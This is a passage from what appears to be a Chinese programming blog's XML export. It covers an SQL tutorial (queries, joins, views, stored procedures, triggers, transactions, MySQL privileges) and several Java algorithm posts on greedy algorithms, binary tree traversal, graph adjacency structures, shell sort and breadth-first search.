LIMIT限制返回的行数。可以有两个参数，第一个参数为起始行，从 0 开始；第二个参数为返回的总行数。 返回前 5 行： 123SELECT *FROM mytableLIMIT 5; 123SELECT *FROM mytableLIMIT 0, 5; 返回第 3 ~ 5 行： 123SELECT *FROM mytableLIMIT 2, 3; 八、排序 ASC ：升序（默认） DESC ：降序 可以按多个列进行排序，并且为每个列指定不同的排序方式： 123SELECT *FROM mytableORDER BY col1 DESC, col2 ASC; 九、过滤不进行过滤的数据非常大，导致通过网络传输了多余的数据，从而浪费了网络带宽。因此尽量使用 SQL 语句来过滤不必要的数据，而不是传输所有的数据到客户端中然后由客户端进行过滤。 123SELECT *FROM mytableWHERE col IS NULL; 下表显示了 WHERE 子句可用的操作符 操作符 说明 = 等于 &lt; 小于 &gt; 大于 &lt;&gt; != 不等于 &lt;= !&gt; 小于等于 &gt;= !&lt; 大于等于 BETWEEN 在两个值之间 IS NULL 为 NULL 值 应该注意到，NULL 与 0、空字符串都不同。 AND 和 OR 用于连接多个过滤条件。优先处理 AND，当一个过滤表达式涉及到多个 AND 和 OR 时，可以使用 () 来决定优先级，使得优先级关系更清晰。 IN 操作符用于匹配一组值，其后也可以接一个 SELECT 子句，从而匹配子查询得到的一组值。 NOT 操作符用于否定一个条件。 十、通配符通配符也是用在过滤语句中，但它只能用于文本字段。 % 匹配 &gt;=0 个任意字符； _ 匹配 ==1 个任意字符； [ ] 可以匹配集合内的字符，例如 [ab] 将匹配字符 a 或者 b。用脱字符 ^ 可以对其进行否定，也就是不匹配集合内的字符。 使用 Like 来进行通配符匹配。 123SELECT *FROM mytableWHERE col LIKE '[^AB]%'; -- 不以 A 和 B 开头的任意文本 不要滥用通配符，通配符位于开头处匹配会非常慢。 十一、计算字段在数据库服务器上完成数据的转换和格式化的工作往往比客户端上快得多，并且转换和格式化后的数据量更少的话可以减少网络通信量。 计算字段通常需要使用 AS 来取别名，否则输出的时候字段名为计算表达式。 12SELECT col1 * col2 AS aliasFROM mytable; CONCAT() 用于连接两个字段。许多数据库会使用空格把一个值填充为列宽，因此连接的结果会出现一些不必要的空格，使用 TRIM() 可以去除首尾空格。 12SELECT CONCAT(TRIM(col1), '(', TRIM(col2), ')') AS concat_colFROM mytable; 十二、函数各个 DBMS 的函数都是不相同的，因此不可移植，以下主要是 MySQL 的函数。 汇总 函 数 说 明 AVG() 返回某列的平均值 COUNT() 返回某列的行数 MAX() 返回某列的最大值 MIN() 返回某列的最小值 SUM() 返回某列值之和 AVG() 会忽略 NULL 行。 使用 DISTINCT 可以让汇总函数值汇总不同的值。 12SELECT AVG(DISTINCT col1) AS avg_colFROM mytable; 文本处理 函数 说明 LEFT() 左边的字符 RIGHT() 右边的字符 LOWER() 转换为小写字符 UPPER() 转换为大写字符 LTRIM() 去除左边的空格 RTRIM() 去除右边的空格 LENGTH() 长度 SOUNDEX() 转换为语音值 其中， SOUNDEX() 可以将一个字符串转换为描述其语音表示的字母数字模式。 123SELECT *FROM mytableWHERE SOUNDEX(col1) = SOUNDEX('apple') 日期和时间处理 日期格式：YYYY-MM-DD 时间格式：HH:MM:SS 函 数 说 明 AddDate() 增加一个日期（天、周等） AddTime() 增加一个时间（时、分等） CurDate() 返回当前日期 CurTime() 返回当前时间 Date() 返回日期时间的日期部分 DateDiff() 计算两个日期之差 Date_Add() 高度灵活的日期运算函数 Date_Format() 返回一个格式化的日期或时间串 Day() 返回一个日期的天数部分 DayOfWeek() 对于一个日期，返回对应的星期几 Hour() 返回一个时间的小时部分 Minute() 返回一个时间的分钟部分 Month() 返回一个日期的月份部分 Now() 返回当前日期和时间 Second() 返回一个时间的秒部分 Time() 返回一个日期时间的时间部分 Year() 返回一个日期的年份部分 1mysql&gt; SELECT NOW(); 12018-4-14 20:25:11 数值处理 函数 说明 SIN() 正弦 COS() 余弦 TAN() 正切 ABS() 绝对值 SQRT() 平方根 MOD() 余数 EXP() 指数 PI() 圆周率 RAND() 随机数 十三、分组分组就是把具有相同的数据值的行放在同一组中。 可以对同一分组数据使用汇总函数进行处理，例如求分组数据的平均值等。 指定的分组字段除了能按该字段进行分组，也会自动按该字段进行排序。 123SELECT col, COUNT(*) AS numFROM mytableGROUP BY col; GROUP BY 自动按分组字段进行排序，ORDER BY 也可以按汇总字段来进行排序。 1234SELECT col, COUNT(*) AS numFROM mytableGROUP BY colORDER BY num; WHERE 过滤行，HAVING 过滤分组，行过滤应当先于分组过滤。 12345SELECT col, COUNT(*) AS numFROM mytableWHERE col &gt; 2GROUP BY colHAVING num &gt;= 2; 分组规定： GROUP BY 子句出现在 WHERE 子句之后，ORDER BY 子句之前； 除了汇总字段外，SELECT 语句中的每一字段都必须在 GROUP BY 子句中给出； NULL 的行会单独分为一组； 大多数 SQL 实现不支持 GROUP BY 列具有可变长度的数据类型。 十四、子查询子查询中只能返回一个字段的数据。 可以将子查询的结果作为 WHRER 语句的过滤条件： 1234SELECT *FROM mytable1WHERE col1 IN (SELECT col2 FROM mytable2); 下面的语句可以检索出客户的订单数量，子查询语句会对第一个查询检索出的每个客户执行一次： 123456SELECT cust_name, (SELECT COUNT(*) FROM Orders WHERE Orders.cust_id = Customers.cust_id) AS orders_numFROM CustomersORDER BY cust_name; 十五、连接连接用于连接多个表，使用 JOIN 关键字，并且条件语句使用 ON 而不是 WHERE。 连接可以替换子查询，并且比子查询的效率一般会更快。 可以用 AS 给列名、计算字段和表名取别名，给表名取别名是为了简化 SQL 语句以及连接相同表。 内连接内连接又称等值连接，使用 INNER JOIN 关键字。 123SELECT A.value, B.valueFROM tablea AS A INNER JOIN tableb AS BON A.key = B.key; 可以不明确使用 INNER JOIN，而使用普通查询并在 WHERE 中将两个表中要连接的列用等值方法连接起来。 123SELECT A.value, B.valueFROM tablea AS A, tableb AS BWHERE A.key = B.key; 在没有条件语句的情况下返回笛卡尔积。 自连接自连接可以看成内连接的一种，只是连接的表是自身而已。 一张员工表，包含员工姓名和员工所属部门，要找出与 Jim 处在同一部门的所有员工姓名。 子查询版本 123456SELECT nameFROM employeeWHERE department = ( SELECT department FROM employee WHERE name = "Jim"); 自连接版本 1234SELECT e1.nameFROM employee AS e1 INNER JOIN employee AS e2ON e1.department = e2.department AND e2.name = "Jim"; 自然连接自然连接是把同名列通过等值测试连接起来的，同名列可以有多个。 内连接和自然连接的区别：内连接提供连接的列，而自然连接自动连接所有同名列。 12SELECT A.value, B.valueFROM tablea AS A NATURAL JOIN tableb AS B; 外连接外连接保留了没有关联的那些行。分为左外连接，右外连接以及全外连接，左外连接就是保留左表没有关联的行。 检索所有顾客的订单信息，包括还没有订单信息的顾客。 123SELECT Customers.cust_id, Orders.order_numFROM Customers LEFT OUTER JOIN OrdersON Customers.cust_id = Orders.cust_id; customers 表： cust_id cust_name 1 a 2 b 3 c orders 表： order_id cust_id 1 1 2 1 3 3 4 3 结果： cust_id cust_name order_id 1 a 1 1 a 2 3 c 3 3 c 4 2 b Null 十六、组合查询使用 UNION 来组合两个查询，如果第一个查询返回 M 行，第二个查询返回 N 行，那么组合查询的结果一般为 M+N 行。 每个查询必须包含相同的列、表达式和聚集函数。 默认会去除相同行，如果需要保留相同行，使用 UNION ALL。 只能包含一个 ORDER BY 子句，并且必须位于语句的最后。 1234567SELECT colFROM mytableWHERE col = 1UNIONSELECT colFROM mytableWHERE col =2; 十七、视图视图是虚拟的表，本身不包含数据，也就不能对其进行索引操作。 对视图的操作和对普通表的操作一样。 视图具有如下好处： 简化复杂的 SQL 操作，比如复杂的连接； 只使用实际表的一部分数据； 通过只给用户访问视图的权限，保证数据的安全性； 更改数据格式和表示。 1234CREATE VIEW myview ASSELECT Concat(col1, col2) AS concat_col, col3*col4 AS compute_colFROM mytableWHERE col5 = val; 十八、存储过程存储过程可以看成是对一系列 SQL 操作的批处理。 使用存储过程的好处： 代码封装，保证了一定的安全性； 代码复用； 由于是预先编译，因此具有很高的性能。 命令行中创建存储过程需要自定义分隔符，因为命令行是以 ; 为结束符，而存储过程中也包含了分号，因此会错误把这部分分号当成是结束符，造成语法错误。 包含 in、out 和 inout 三种参数。 给变量赋值都需要用 select into 语句。 每次只能给一个变量赋值，不支持集合的操作。 123456789101112delimiter //create procedure myprocedure( out ret int ) begin declare y int; select sum(col1) from mytable into y; select y*y into ret; end //delimiter ; 12call myprocedure(@ret);select @ret; 十九、游标在存储过程中使用游标可以对一个结果集进行移动遍历。 游标主要用于交互式应用，其中用户需要对数据集中的任意行进行浏览和修改。 使用游标的四个步骤： 声明游标，这个过程没有实际检索出数据； 打开游标； 取出数据； 关闭游标； 1234567891011121314151617181920delimiter //create procedure myprocedure(out ret int) begin declare done boolean default 0; declare mycursor cursor for select col1 from mytable; # 定义了一个 continue handler，当 sqlstate '02000' 这个条件出现时，会执行 set done = 1 declare continue handler for sqlstate '02000' set done = 1; open mycursor; repeat fetch mycursor into ret; select ret; until done end repeat; close mycursor; end // delimiter ; 二十、触发器触发器会在某个表执行以下语句时而自动执行：DELETE、INSERT、UPDATE。 触发器必须指定在语句执行之前还是之后自动执行，之前执行使用 BEFORE 关键字，之后执行使用 AFTER 关键字。BEFORE 用于数据验证和净化，AFTER 用于审计跟踪，将修改记录到另外一张表中。 INSERT 触发器包含一个名为 NEW 的虚拟表。 1234CREATE TRIGGER mytrigger AFTER INSERT ON mytableFOR EACH ROW SELECT NEW.col into @result;SELECT @result; -- 获取结果 DELETE 触发器包含一个名为 OLD 的虚拟表，并且是只读的。 UPDATE 触发器包含一个名为 NEW 和一个名为 OLD 的虚拟表，其中 NEW 是可以被修改的，而 OLD 是只读的。 MySQL 不允许在触发器中使用 CALL 语句，也就是不能调用存储过程。 二十一、事务管理基本术语： 事务（transaction）指一组 SQL 语句； 回退（rollback）指撤销指定 SQL 语句的过程； 提交（commit）指将未存储的 SQL 语句结果写入数据库表； 保留点（savepoint）指事务处理中设置的临时占位符（placeholder），你可以对它发布回退（与回退整个事务处理不同）。 不能回退 SELECT 语句，回退 SELECT 语句也没意义；也不能回退 CREATE 和 DROP 语句。 MySQL 的事务提交默认是隐式提交，每执行一条语句就把这条语句当成一个事务然后进行提交。当出现 START TRANSACTION 语句时，会关闭隐式提交；当 COMMIT 或 ROLLBACK 语句执行后，事务会自动关闭，重新恢复隐式提交。 通过设置 autocommit 为 0 可以取消自动提交；autocommit 标记是针对每个连接而不是针对服务器的。 如果没有设置保留点，ROLLBACK 会回退到 START TRANSACTION 语句处；如果设置了保留点，并且在 ROLLBACK 中指定该保留点，则会回退到该保留点。 1234567START TRANSACTION// ...SAVEPOINT delete1// ...ROLLBACK TO delete1// ...COMMIT 二十二、字符集基本术语： 字符集为字母和符号的集合； 编码为某个字符集成员的内部表示； 校对字符指定如何比较，主要用于排序和分组。 除了给表指定字符集和校对外，也可以给列指定： 123CREATE TABLE mytable(col VARCHAR(10) CHARACTER SET latin COLLATE latin1_general_ci )DEFAULT CHARACTER SET hebrew COLLATE hebrew_general_ci; 可以在排序、分组时指定校对： 123SELECT *FROM mytableORDER BY col COLLATE latin1_general_ci; 二十三、权限管理MySQL 的账户信息保存在 mysql 这个数据库中。 12USE mysql;SELECT user FROM user; 创建账户 新创建的账户没有任何权限。 1CREATE USER myuser IDENTIFIED BY 'mypassword'; 修改账户名 1RENAME myuser TO newuser; 删除账户 1DROP USER myuser; 查看权限 1SHOW GRANTS FOR myuser; 授予权限 账户用 username@host 的形式定义，username@% 使用的是默认主机名。 1GRANT SELECT, INSERT ON mydatabase.* TO myuser; 删除权限 GRANT 和 REVOKE 可在几个层次上控制访问权限： 整个服务器，使用 GRANT ALL 和 REVOKE ALL； 整个数据库，使用 ON database.*； 特定的表，使用 ON database.table； 特定的列； 特定的存储过程。 1REVOKE SELECT, INSERT ON mydatabase.* FROM myuser; 更改密码 必须使用 Password() 函数 1SET PASSWROD FOR myuser = Password('new_password');]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>CRUD</tag>
        <tag>SQL语句</tag>
        <tag>触发器</tag>
        <tag>存储过程</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[贪心算法]]></title>
    <url>%2F2017%2F11%2F13%2F%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95%2F</url>
    <content type="text"><![CDATA[基本概念所谓贪心算法是指，在对问题求解时，总是做出在当前看来是最好的选择。也就是说，不从整体最优上加以考虑，他所做出的仅是在某种意义上的局部最优解。 贪心算法的基本思路 建立数学模型来描述问题。 把求解的问题分成若干个子问题。 对每一子问题求解，得到子问题的局部最优解。 把子问题的解局部最优解合成原来解问题的一个解。 贪心算法的实现框架从问题的某一初始解出发； ​ while （能朝给定总目标前进一步） ​ { ​ 利用可行的决策，求出可行解的一个解元素； ​ } ​ 由所有解元素组合成问题的一个可行解； 例题:优势洗牌 给定两个大小相等的数组 A 和 B，A 相对于 B 的优势可以用满足 A[i] &gt; B[i] 的索引 i 的数目来描述。 返回 A 的任意排列，使其相对于 B 的优势最大化。 示例 1： 12输入：A = [2,7,11,15], B = [1,10,4,11]输出：[2,11,7,15] 示例 2： 12输入：A = [12,24,8,32], B = [13,25,32,11]输出：[24,32,8,12] 提示： 1231 &lt;= A.length = B.length &lt;= 100000 &lt;= A[i] &lt;= 10^90 &lt;= B[i] &lt;= 10^9 解决方案: 123456789101112131415161718192021222324252627282930313233343536class Solution &#123; public int[] advantageCount(int[] A, int[] B) &#123; Arrays.sort(A); List&lt;Integer&gt; a = new ArrayList&lt;&gt;(); for (int a0 : A) &#123; a.add(a0); &#125; int[] res = new int[A.length]; for (int i = 0, len = B.length; i &lt; len; i++) &#123; res[i] = find(a, B[i], 0, a.size() - 1); &#125; return res; &#125; private int find(List&lt;Integer&gt; a, int target, int head, int last) &#123; if (a.get(last) &lt;= target || a.get(head) &gt; target) &#123; int res = a.get(head); a.remove(head); return res; &#125; while (a.get(head) &lt;= target &amp;&amp; a.get(last) &gt; target) &#123; if (last - head == 1) &#123; int res = a.get(last); a.remove(last); return res; &#125; int mid = (head + last) / 2; if (a.get(mid) &lt;= target) &#123; head = mid; &#125; else &#123; last = mid; &#125; &#125; return 0; &#125;&#125;]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>贪心算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[树]]></title>
    <url>%2F2017%2F11%2F13%2F%E6%A0%91%2F</url>
    <content type="text"><![CDATA[介绍树 是一种经常用到的数据结构，用来模拟具有树状结构性质的数据集合。 树里的每一个节点有一个根植和一个包含所有子节点的列表。从图的观点来看，树也可视为一个拥有N 个节点和N-1 条边的一个有向无环图。 二叉树是一种更为典型的树树状结构。如它名字所描述的那样，二叉树是每个节点最多有两个子树的树结构，通常子树被称作“左子树”和“右子树”。 先上二叉树的数据结构： 1234567class Node&#123; int value; //左孩子 TreeNode left; //右孩子 TreeNode right;&#125; 二叉树的遍历 前序遍历首先访问根节点，然后遍历左子树，最后遍历右子树。 12345678public static void preOrderRecur(Node head) &#123; if (head == null) &#123; return; &#125; System.out.print(head.value + " "); preOrderRecur(head.left); preOrderRecur(head.right); &#125; 中序遍历 中序遍历是先遍历左子树，然后访问根节点，然后遍历右子树。 12345678public static void inOrderRecur(Node head) &#123; if (head == null) &#123; return; &#125; inOrderRecur(head.left); System.out.print(head.value + " "); inOrderRecur(head.right);&#125; 后序遍历 后序遍历是先遍历左子树，然后遍历右子树，最后访问树的根节点。 12345678public static void posOrderRecur(Node head) &#123; if (head == null) &#123; return; &#125; posOrderRecur(head.left); posOrderRecur(head.right); System.out.print(head.value + " ");&#125; 层序遍历 层序遍历就是逐层遍历树结构。 广度优先搜索是一种广泛运用在树或图这类数据结构中，遍历或搜索的算法。 该算法从一个根节点开始，首先访问节点本身。 然后遍历它的相邻节点，其次遍历它的二级邻节点、三级邻节点，以此类推。 当我们在树中进行广度优先搜索时，我们访问的节点的顺序是按照层序遍历顺序的。 12345678910111213141516171819202122//层次遍历 public void theLeverTraversal(Node root) &#123; if (root == null) &#123; return; &#125; //新建一个队列，LinkedList实现了Quene接口，可以直接当作队列来用 LinkedList&lt;Node&gt; queue = new LinkedList&lt;Node&gt;(); Node current; //当前节点 queue.offer(root);//根节点入队列 while (!queue.isEmpty()) &#123; current = queue.poll(); //取出队列的头节点 System.out.print(current.value + &quot; &quot;);//输出队列的头节点的值 if (current.left != null) &#123; queue.offer(current.left); //如果当前节点的左节点不为空，则左节点入队列 &#125; if (current.right != null) &#123; queue.offer(current.right); //如果当前节点的右节点不为空，则右节点入队列 &#125; &#125; &#125;]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>递归</tag>
        <tag>树</tag>
        <tag>二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[图]]></title>
    <url>%2F2017%2F11%2F11%2F%E5%9B%BE%2F</url>
    <content type="text"><![CDATA[图的基础 A graph is a data structure where a node can have zero or more adjacent elements. The connection between two nodes is called edge. Nodes can also be called vertices. 图是一种数据结构，其中节点可以具有零个或多个相邻元素。两个节点之间的连接称为边缘。节点也可以称为顶点。 名称 内容 顶点的度 一个顶点的度（degree）是指与该顶点相连的边的条数。比如上图中，紫色顶点的度是 3，蓝色顶点的度是 1。 无向图（undirected graph） 如果所有的边都是双向（译者注：或者理解为没有方向）的，那我们就有了一个无向图（undirected graph）。 有向图（directed graph） 如果边是有向的，我们得到的就是有向图（directed graph）。你可以将有向图和无向图想象为单行道或双行道组成的交通网。 环（cycle） 图可以有环（cycle），即如果遍历图的顶点，某个顶点可以被访问超过一次。 无环图（acyclic graph） 没有环的图被称为无环图（acyclic graph）。 连通图（connected graph） 从任一节点出发，沿着各条边可以访问图中任意节点 非连通图（disconnected graph） 从一个顶点出发，并非所有顶点都是可到达的。 完全图（complete graph） 当一个图中两两不同的顶点之间都恰有一条边相连，这样的图就是完全图（complete graph）。 图的应用当图的每条边都被分配了权重时，我们就有了一个加权图（weighted graph）。如果边的权重被忽略，那么可以认为每条边的权重都相同。 加权图应用的场景很多，根据待解决问题主体的不同，有不同的展现。 航空线路图 (如上图所示) 顶点 = 机场 边 = 两个机场间的飞行线路 权重 = 两个机场间的距离 GPS 导航 顶点 = 交叉路口 边 = 道路 权重 = 从一个路口到另一个路口所花的时间 网络 顶点 = 服务器 边 = 数据链路 权重 = 连接速度 图在现实世界中的应用有： 电子电路 航空控制 行车导航 电信设施： 基站建设规划 社交网络： Facebook 利用图来推荐（你可能认识的）朋友 推荐系统： Amazon/Netflix 利用图来推荐产品与电影 利用图来规划物流线路 图的存储结构图可以使用两种存储结构，分别是邻接矩阵和邻接表。 邻接矩阵无向图123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566public class MatrixNDG &#123; int size;//图顶点个数 char[] vertexs;//图顶点名称 int[][] matrix;//图关系矩阵 public MatrixNDG(char[] vertexs,char[][] edges)&#123; size=vertexs.length; matrix=new int[size][size];//设定图关系矩阵大小 this.vertexs=vertexs; for(char[] c:edges)&#123;//设置矩阵值 int p1 = getPosition(c[0]);//根据顶点名称确定对应矩阵下标 int p2 = getPosition(c[1]); matrix[p1][p2] = 1;//无向图，在两个对称位置存储 matrix[p2][p1] = 1; &#125; &#125; //图的遍历输出 public void print()&#123; for(int[] i:matrix)&#123; for(int j:i)&#123; System.out.print(j+" "); &#125; System.out.println(); &#125; &#125; //根据顶点名称获取对应的矩阵下标 private int getPosition(char ch) &#123; for(int i=0; i&lt;vertexs.length; i++) if(vertexs[i]==ch) return i; return -1; &#125; public static void main(String[] args) &#123; char[] vexs = &#123;'A', 'B', 'C', 'D', 'E', 'F', 'G','H','I','J','K'&#125;; char[][] edges = new char[][]&#123; &#123;'A', 'C'&#125;, &#123;'A', 'D'&#125;, &#123;'A', 'F'&#125;, &#123;'B', 'C'&#125;, &#123;'C', 'D'&#125;, &#123;'E', 'G'&#125;, &#123;'D', 'G'&#125;, &#123;'I','J'&#125;, &#123;'J','G'&#125;,&#125;; MatrixNDG pG; // 自定义"图"(输入矩阵队列) // 采用已有的"图" long start=System.nanoTime(); for(int i=0;i&lt;10000;i++)&#123; pG = new MatrixNDG(vexs, edges); //pG.print(); // 打印图 &#125; long end=System.nanoTime(); System.out.println(end-start); &#125;&#125; 邻接矩阵有向图123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960public class MatrixDG &#123; int size; char[] vertexs; int[][] matrix; public MatrixDG(char[] vertexs,char[][] edges)&#123; size=vertexs.length; matrix=new int[size][size]; this.vertexs=vertexs; //和邻接矩阵无向图差别仅仅在这里 for(char[] c:edges)&#123; int p1 = getPosition(c[0]); int p2 = getPosition(c[1]); matrix[p1][p2] = 1; &#125; &#125; public void print()&#123; for(int[] i:matrix)&#123; for(int j:i)&#123; System.out.print(j+" "); &#125; System.out.println(); &#125; &#125; private int getPosition(char ch) &#123; for(int i=0; i&lt;vertexs.length; i++) if(vertexs[i]==ch) return i; return -1; &#125; public static void main(String[] args) &#123; char[] vexs = &#123;'A', 'B', 'C', 'D', 'E', 'F', 'G','H','I','J','K'&#125;; char[][] edges = new char[][]&#123; &#123;'A', 'C'&#125;, &#123;'A', 'D'&#125;, &#123;'A', 'F'&#125;, &#123;'B', 'C'&#125;, &#123;'C', 'D'&#125;, &#123;'E', 'G'&#125;, &#123;'D', 'G'&#125;, &#123;'I','J'&#125;, &#123;'J','G'&#125;,&#125;; MatrixDG pG; // 自定义"图"(输入矩阵队列) //pG = new MatrixUDG(); // 采用已有的"图" pG = new MatrixDG(vexs, edges); pG.print(); &#125;&#125; 邻接表无向图12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788public class ListNDG &#123; Vertex[] vertexLists;//邻接表数组 int size; class Vertex&#123;//邻接表节点类，单链表数据结构 char ch; Vertex next; Vertex(char ch)&#123;//初始化方法 this.ch=ch; &#125; void add(char ch)&#123;//加到链表尾 Vertex node=this; while(node.next!=null)&#123; node=node.next; &#125; node.next=new Vertex(ch); &#125; &#125; public ListNDG(char[] vertexs,char[][] edges)&#123; size=vertexs.length; this.vertexLists=new Vertex[size];//确定邻接表大小 //设置邻接表头节点 for(int i=0;i&lt;size;i++)&#123; this.vertexLists[i]=new Vertex(vertexs[i]); &#125; //存储边信息 for(char[] c:edges)&#123; int p1=getPosition(c[0]); vertexLists[p1].add(c[1]); int p2=getPosition(c[1]); vertexLists[p2].add(c[0]); &#125; &#125; //跟据顶点名称获取链表下标 private int getPosition(char ch) &#123; for(int i=0; i&lt;size; i++) if(vertexLists[i].ch==ch) return i; return -1; &#125; //遍历输出邻接表 public void print()&#123; for(int i=0;i&lt;size;i++)&#123; Vertex temp=vertexLists[i]; while(temp!=null)&#123; System.out.print(temp.ch+" "); temp=temp.next; &#125; System.out.println(); &#125; &#125; public static void main(String[] args)&#123; char[] vexs = &#123;'A', 'B', 'C', 'D', 'E', 'F', 'G','H','I','J','K'&#125;; char[][] edges = new char[][]&#123; &#123;'A', 'C'&#125;, &#123;'A', 'D'&#125;, &#123;'A', 'F'&#125;, &#123;'B', 'C'&#125;, &#123;'C', 'D'&#125;, &#123;'E', 'G'&#125;, &#123;'D', 'G'&#125;, &#123;'I','J'&#125;, &#123;'J','G'&#125;,&#125;; ListNDG pG; long start=System.nanoTime(); for(int i=0;i&lt;10000;i++)&#123; pG = new ListNDG(vexs, edges); //pG.print(); // 打印图 &#125; long end=System.nanoTime(); System.out.println(end-start); &#125;&#125; 邻接表有向图1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283public class ListDG &#123; Vertex[] vertexLists; int size; class Vertex&#123; char ch; Vertex next; Vertex(char ch)&#123; this.ch=ch; &#125; void add(char ch)&#123; Vertex node=this; while(node.next!=null)&#123; node=node.next; &#125; node.next=new Vertex(ch); &#125; &#125; public ListDG(char[] vertexs,char[][] edges)&#123; size=vertexs.length; this.vertexLists=new Vertex[size]; for(int i=0;i&lt;size;i++)&#123; this.vertexLists[i]=new Vertex(vertexs[i]); &#125; for(char[] c:edges)&#123; int p=getPosition(c[0]); vertexLists[p].add(c[1]); &#125; &#125; private int getPosition(char ch) &#123; for(int i=0; i&lt;size; i++) if(vertexLists[i].ch==ch) return i; return -1; &#125; public void print()&#123; for(int i=0;i&lt;size;i++)&#123; Vertex temp=vertexLists[i]; while(temp!=null)&#123; System.out.print(temp.ch+" "); temp=temp.next; &#125; System.out.println(); &#125; &#125; public static void main(String[] args)&#123; char[] vexs = &#123;'A', 'B', 'C', 'D', 'E', 'F', 'G','H','I','J','K'&#125;; char[][] edges = new char[][]&#123; &#123;'A', 'C'&#125;, &#123;'A', 'D'&#125;, &#123;'A', 'F'&#125;, &#123;'B', 'C'&#125;, &#123;'C', 'D'&#125;, &#123;'E', 'G'&#125;, &#123;'D', 'G'&#125;, &#123;'I','J'&#125;, &#123;'J','G'&#125;,&#125;; ListDG pG; long start=System.nanoTime(); for(int i=0;i&lt;10000;i++)&#123; pG = new ListDG(vexs, edges); //pG.print(); // 打印图 &#125; long end=System.nanoTime(); System.out.println(end-start); &#125;&#125;]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>图</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[希尔排序]]></title>
    <url>%2F2017%2F11%2F05%2F%E5%B8%8C%E5%B0%94%E6%8E%92%E5%BA%8F%2F</url>
    <content type="text"><![CDATA[基本思想在要排序的一组数中，根据某一增量分为若干子序列，并对子序列分别进行插入排序。然后逐渐将增量减小,并重复上述过程。直至增量为1,此时数据序列基本有序,最后进行插入排序。 java代码实现1234567891011121314151617181920212223242526272829public static void shell_sort(int array[],int lenth)&#123; int temp = 0; int incre = lenth; while(true)&#123; incre = incre/2; for(int k = 0;k&lt;incre;k++)&#123; //根据增量分为若干子序列 for(int i=k+incre;i&lt;lenth;i+=incre)&#123; for(int j=i;j&gt;k;j-=incre)&#123; if(array[j]&lt;array[j-incre])&#123; temp = array[j-incre]; array[j-incre] = array[j]; array[j] = temp; &#125;else&#123; break; &#125; &#125; &#125; &#125; if(incre == 1)&#123; break; &#125; &#125;&#125;]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>排序</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[广度优先搜索]]></title>
    <url>%2F2017%2F11%2F04%2F%E5%B9%BF%E5%BA%A6%E4%BC%98%E5%85%88%E6%90%9C%E7%B4%A2%2F</url>
    <content type="text"><![CDATA[基本概念广度优先搜索算法（英语：Breadth-First-Search，缩写为BFS），又译作宽度优先搜索，或横向优先搜索，是一种图形搜索算法。简单的说，BFS是从根节点开始，沿着树的宽度遍历树的节点。如果所有节点均被访问，则算法中止。广度优先搜索的实现一般采用open-closed表。 例题：被围绕的区域 给定一个二维的矩阵，包含 &#39;X&#39; 和 &#39;O&#39;（字母 O）。 找到所有被 &#39;X&#39; 围绕的区域，并将这些区域里所有的 &#39;O&#39; 用 &#39;X&#39; 填充。 示例: 1234X X X XX O O XX X O XX O X X 运行你的函数后，矩阵变为： 1234X X X XX X X XX X X XX O X X 解释: 被围绕的区间不会存在于边界上，换句话说，任何边界上的 &#39;O&#39; 都不会被填充为 &#39;X&#39;。 任何不在边界上，或不与边界上的 &#39;O&#39; 相连的 &#39;O&#39; 最终都会被填充为 &#39;X&#39;。如果两个元素在水平或垂直方向相邻，则称它们是“相连”的。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253class Solution &#123; private boolean[][] juge = new boolean[1000][1000]; public void solve(char[][] board) &#123; if (board.length - 1 &lt;= 0 || board[0].length &lt;= 0) return; int m = board.length - 1; int n = board[0].length - 1; for (int i = 1; i &lt; m; i++) &#123; for (int j = 1; j &lt; n; j++) &#123; if (board[i][j] == 'O' &amp;&amp; !juge[i][j]) bfs(i, j, board, m, n); &#125; &#125;&#125;public void bfs(int x, int y, char[][] board, int m, int n) &#123; List&lt;int[]&gt; jugehuan = new ArrayList&lt;&gt;(); boolean isHuan = false; //能改变的方向四个 int[][] change = &#123;&#123;1, 0&#125;, &#123;0, 1&#125;, &#123;-1, 0&#125;, &#123;0, -1&#125;&#125;; //bfs队列 Queue&lt;int[]&gt; q = new LinkedList&lt;&gt;(); int[] one = &#123;x, y&#125;; //扫描到的第一个0进入队列 q.add(one); board[x][y] = 'X'; juge[x][y] = true; while (!q.isEmpty()) &#123; int[] nowxy = q.poll(); jugehuan.add(nowxy); for (int i = 0; i &lt; 4; i++) &#123; int changex = nowxy[0] + change[i][0]; int changey = nowxy[1] + change[i][1]; if (changex &gt;= 1 &amp;&amp; changex &lt; m &amp;&amp; changey &gt;= 1 &amp;&amp; changey &lt; n) &#123; if (board[changex][changey] == 'O') &#123; int[] now = &#123;changex, changey&#125;; q.add(now); board[changex][changey] = 'X'; juge[changex][changey] = true; &#125; &#125; else &#123; if (board[changex][changey] == 'O') isHuan = true; &#125; &#125; &#125; if (isHuan) &#123; for (int i = 0; i &lt; jugehuan.size(); i++) &#123; board[jugehuan.get(i)[0]][jugehuan.get(i)[1]] = 'O'; &#125; &#125;&#125;&#125;]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>广度优先搜索</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[归并排序]]></title>
    <url>%2F2017%2F11%2F03%2F%E5%BD%92%E5%B9%B6%E6%8E%92%E5%BA%8F%2F</url>
